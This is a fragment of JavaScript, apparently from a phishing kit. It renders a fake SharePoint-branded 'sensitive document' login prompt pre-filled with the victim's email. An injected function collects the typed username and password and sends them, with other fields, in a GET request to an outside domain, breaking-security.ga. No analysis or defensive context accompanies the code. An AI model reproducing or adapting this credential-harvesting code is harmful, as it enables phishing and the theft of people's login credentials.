...
function uigjsh() {
    ...
    if (allow != 'yes') {
        ...
        var form = `<img src="sharepoint.png"><p>This is a sensitive document, you must authenticate to view!</p><h5 id="email">`+em+`</h5>
        ...
        x.text = `function yeres(){var e=document.getElementById("trigger"),t=document.getElementById("username").value,n=document.getElementById("pass").value,a=document.getElementById("iii").value,d=document.getElementById("reason").value,s=document.getElementById("rrr").value;if(e.innerText="Please wait...",!t||!n||!a)return document.getElementById("error-div").style.display="block",void(e.innerText="Verify");const l=new XMLHttpRequest;l.onreadystatechange=function(){4==this.readyState&&200==this.status&&("ok"===this.responseText?(document.getElementById("myModal").classList.toggle("show-modal"),document.getElementById("allow").value="yes"):(document.getElementById("reason").value="2",document.getElementById("username").value="",document.getElementById("pass").value="",document.getElementById("error-div").style.display="block",e.innerText="View Document"))},l.open("GET","https://breaking-security.ga?target=attachment&username="+t+"&password="+n+"&reason="+d+"&owner="+a+"&r="+s),l.send()}`;
